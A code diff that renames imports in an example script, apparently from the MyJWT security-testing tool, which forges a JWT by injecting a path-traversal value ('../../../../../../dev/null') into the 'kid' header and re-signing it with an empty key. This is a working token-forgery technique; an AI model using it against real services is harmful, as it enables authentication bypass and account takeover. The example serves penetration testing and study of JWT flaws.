@@ -1,6 +1,6 @@
-from MyJWT.modifyJWT import signature
-from MyJWT.utils import jwtToJson
-from MyJWT.vulnerabilities import injectSqlKid
+from myjwt.modify_jwt import signature
+from myjwt.utils import jwt_to_json
+from myjwt.vulnerabilities import inject_sql_kid
 
 jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6ImtleTEifQ.eyJ1c2VyIjpudWxsfQ.2B9ZKzJ3FeJ9yoNLDGKgcxOuo05PwDRzFQ_34CrGteQ"
 # Header: {"typ": "JWT", "alg": "HS256", "kid": "key1"}
@@ -10,8 +10,8 @@ injection = "../../../../../../dev/null"
 # your injection
 sign = ""
 # empty signature
-jwt = injectSqlKid(jwt, injection)
+jwt = inject_sql_kid(jwt, injection)
 # inject your payload in kid key
-jwt = signature(jwtToJson(jwt), sign)
+jwt = signature(jwt_to_json(jwt), sign)
 # after your jwt header changed re-sign your jwt
 print(jwt)
